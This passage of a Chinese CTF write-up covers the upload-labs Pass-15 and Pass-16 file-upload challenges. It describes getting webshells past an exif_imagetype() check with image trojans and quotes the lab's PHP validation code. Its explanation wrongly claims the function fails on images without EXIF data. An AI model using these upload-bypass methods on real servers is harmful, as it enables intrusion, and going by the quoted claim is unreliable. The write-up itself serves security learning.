+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.45.53.png" style="zoom:40%;">
+
+<p>用老方法也能成功getshell。</p>
+<h2 id="15-4-jpg"><a href="#15-4-jpg" class="headerlink" title="15.4 jpg"></a>15.4 jpg</h2><p>使用上一小节的图片木马：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC-7686811.jpeg" alt="图片木马" style="zoom:50%;">
+
+
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.48.16.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.47.50.png" style="zoom:50%;">
+
+<p>同样也能getshell。不知道这关有啥特别的。</p>
+<h2 id="15-5-代码审计"><a href="#15-5-代码审计" class="headerlink" title="15.5 代码审计"></a>15.5 代码审计</h2><ul>
+<li>提示：</li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.49.00.png" style="zoom:50%;">
+
+<p>使用<code>exif_imagetype()</code>检测文件。</p>
+<ul>
+<li>代码</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token comment">//需要开启php_exif模块</span>
+    <span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_GIF</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_JPEG</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>    
+        <span class="token keyword">default</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$res</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<h4 id="exif-imagetype-检测文件的原理"><a href="#exif-imagetype-检测文件的原理" class="headerlink" title="exif_imagetype()检测文件的原理"></a>exif_imagetype()检测文件的原理</h4><p><code>exif_imagetype()</code> 是 PHP 中的一个内置函数，用于检测图像文件的类型。它的原理是通过读取图像文件的<strong>第一个字节</strong>并检查其<strong>签名（Magic Number）</strong>来确定文件类型。如果发现匹配的签名，函数会返回一个与图像类型对应的常量，否则返回 <code>false</code>。</p>
+<p>工作原理</p>
+<ol>
+<li><strong>读取文件头</strong>：<ul>
+<li><code>exif_imagetype()</code> 仅读取文件的开头部分（通常是一个或几个字节），而不是整个文件内容。</li>
+<li>这种方式效率较高，因为它不需要加载整个文件。</li>
+</ul>
+</li>
+<li><strong>检查文件签名</strong>：<ul>
+<li>每种图像格式都有独特的文件签名。例如：<ul>
+<li>JPEG 文件的签名是 <code>FF D8 FF</code>。</li>
+<li>PNG 文件的签名是 <code>89 50 4E 47 0D 0A 1A 0A</code>。</li>
+<li>GIF 文件的签名是 <code>47 49 46 38 39 61</code> 或 <code>47 49 46 38 37 61</code>。</li>
+</ul>
+</li>
+<li>函数通过比对这些签名来确定文件类型。</li>
+</ul>
+</li>
+<li><strong>返回值</strong>：<ul>
+<li>如果文件签名匹配，函数返回一个整数常量，表示图像类型（例如 <code>IMAGETYPE_JPEG</code>、<code>IMAGETYPE_PNG</code> 等）。</li>
+<li>如果文件签名不匹配或文件无法读取，函数返回 <code>false</code>。</li>
+</ul>
+</li>
+</ol>
+<p>注意事项</p>
+<ul>
+<li><code>exif_imagetype()</code> 无法检测没有 EXIF 信息的图像文件，这种情况下会返回 <code>false</code>。</li>
+<li>在某些服务器上，需要启用 PHP 的 <code>exif</code> 扩展才能使用该函数。</li>
+</ul>
+</blockquote>
+<p>这个函数说到底还是检测文件头的前几个字节，那么之前使用的yakit jpg头部标签估计也适用这一关。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.55.50.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.56.29.png" style="zoom:50%;">
+
+<p>成功getshell。</p>
+<h1 id="十六、Pass-16（）"><a href="#十六、Pass-16（）" class="headerlink" title="十六、Pass-16（）"></a>十六、Pass-16（）</h1><h2 id="16-1-题面"><a href="#16-1-题面" class="headerlink" title="16.1 题面"></a>16.1 题面</h2><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.59.48.png" style="zoom:40%;">
+
+<p>题面还是一样。</p>
+<h2 id="16-2-以往的图片木马上传方法尝试"><a href="#16-2-以往的图片木马上传方法尝试" class="headerlink" title="16.2 以往的图片木马上传方法尝试"></a>16.2 以往的图片木马上传方法尝试</h2><ul>
+<li>gif图片木马</li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2011.01.59.png" style="zoom:50%;">
+
+<p>以往通过加文件头上传图片木马的方法貌似不奏效了。</p>
+<ul>
+<li>jpg图片木马</li>
+</ul>
+<p>使用之前cat命令制作的尾部含有yjh木马的图片文件。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC-7687822.jpeg" style="zoom:80%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2011.04.52.png" style="zoom:50%;">
+
+<p>上传失败。</p>
+<p>传统观念的图片木马的制作方法貌似都失效了。</p>
+<h2 id="16-3-代码审计"><a href="#16-3-代码审计" class="headerlink" title="16.3 代码审计"></a>16.3 代码审计</h2><ul>
+<li>提示</li>
+</ul>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYX